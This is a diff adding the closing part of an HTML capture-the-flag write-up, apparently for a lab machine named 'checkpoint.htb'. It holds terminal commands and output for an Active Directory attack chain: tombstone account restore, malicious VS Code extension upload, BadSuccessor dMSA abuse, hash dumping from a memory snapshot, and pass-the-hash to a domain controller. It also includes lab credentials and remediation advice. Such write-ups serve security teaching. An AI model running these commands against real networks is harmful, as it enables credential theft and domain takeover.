+      <span class="term-label">secretsdump LOCAL</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">secretsdump.py -sam registry.SAM....hive -system registry.SYSTEM....hive \
+     -security registry.SECURITY....hive LOCAL</span>
+<span class="po">[*] Target system bootKey: 0x75247bc64fa0086d2c98744d4bcd53f5
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+</span><span class="pg">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b:::</span></div>
+  </div>
+
+  <p>The backed-up server's local Administrator password was reused for the <strong>domain</strong> Administrator. Pass-the-hash straight to the live DC:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">pass-the-hash → DC01</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc smb dc01.checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b</span>
+<span class="pg">[+] checkpoint.htb\Administrator:f29e9c01... (Pwn3d!)</span>
+<span class="pd">$ </span><span class="pc">nxc smb dc01.checkpoint.htb -u Administrator -H f29e9c01... \
+     -x 'type C:\Users\max.palmer\Desktop\root.txt'</span><span class="po">
+</span><span class="pg">[redacted — root flag]</span></div>
+  </div>
+
+  <div class="alert alert-success">Backups are production data. A memory snapshot is a plaintext copy of everything the machine held in RAM — hives, tokens, keys — sitting in a file share governed by ordinary NTFS permissions. Encrypt backup stores, scope who can read them to a tiny group, and above all <strong>don't reuse the same local-admin password across the estate</strong> — that single reuse is what turns "read an old backup" into "own the domain."</div>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Why it worked</h2>
+
+  <table class="st">
+    <tr><th>Stage</th><th>Root cause</th></tr>
+    <tr><td>alex → mark</td><td>WRITE on <code>CN=Deleted Objects</code> lets a normal user reanimate a tombstoned account with its old password (CWE-284)</td></tr>
+    <tr><td>mark → ryan</td><td>Writable share auto-feeds "approved" <code>.vsix</code> extensions to an editor — writable code path = RCE (CWE-732 / CWE-94)</td></tr>
+    <tr><td>ryan → svc_deploy</td><td>BadSuccessor: create-child on an OU lets a dMSA claim succession to any account and inherit its keys (Server 2025 dMSA abuse)</td></tr>
+    <tr><td>svc_deploy → root</td><td>Domain-admin password reused as a member server's local admin, captured from an unencrypted memory snapshot in a readable backup share (CWE-522 / CWE-259)</td></tr>
+  </table>
+
+  <h2>Key commands</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. Restore the tombstone → mark.davies</span>
+<span class="pc">bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host &lt;IP&gt; \
+   set restore "CN=Mark Davies\0ADEL:2217e877-...,CN=Deleted Objects,DC=checkpoint,DC=htb"</span>
+
+<span class="pco"># 2. VS Code extension RCE → ryan.brooks (user.txt)</span>
+<span class="pc">zip -r exploit.vsix "[Content_Types].xml" extension.vsixmanifest extension/</span>
+<span class="pc">smbclient //checkpoint.htb/DevDrop -U 'checkpoint.htb\mark.davies%Checkpoint2024!' -c 'put exploit.vsix'</span>
+
+<span class="pco"># 3. BadSuccessor → svc_deploy NT hash</span>
+<span class="pc">rubeus.exe tgtdeleg /nowrap        # in the shell; convert kirbi → ccache</span>
+<span class="pc">bloodyAD -k ccache=ryan.ccache -u ryan.brooks --host dc01.checkpoint.htb -d checkpoint.htb \
+   add badSuccessor evilDMSA6 -t "CN=svc_deploy,OU=ServiceAccounts,..." --ou "OU=DMSAHolder,..."</span>
+
+<span class="pco"># 4. VMBackups .vmem → volatility3 → secretsdump → Administrator</span>
+<span class="pc">smbclient //dc01.checkpoint.htb/VMBackups -U 'checkpoint.htb\svc_deploy' --pw-nt-hash &lt;SVC_HASH&gt; \
+   -c 'cd "NightlyBackup_2024-11-01\memory forensics"; get "...Snapshot1.vmem" snapshot.vmem'</span>
+<span class="pc">vol -o out -f snapshot.vmem windows.registry.hivelist.HiveList --dump</span>
+<span class="pc">secretsdump.py -sam SAM.hive -system SYSTEM.hive -security SECURITY.hive LOCAL</span>
+
+<span class="pco"># 5. Pass-the-hash → root.txt</span>
+<span class="pc">nxc smb dc01.checkpoint.htb -u Administrator -H &lt;ADMIN_HASH&gt; -x 'type C:\Users\max.palmer\Desktop\root.txt'</span></div>
+  </div>
+
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
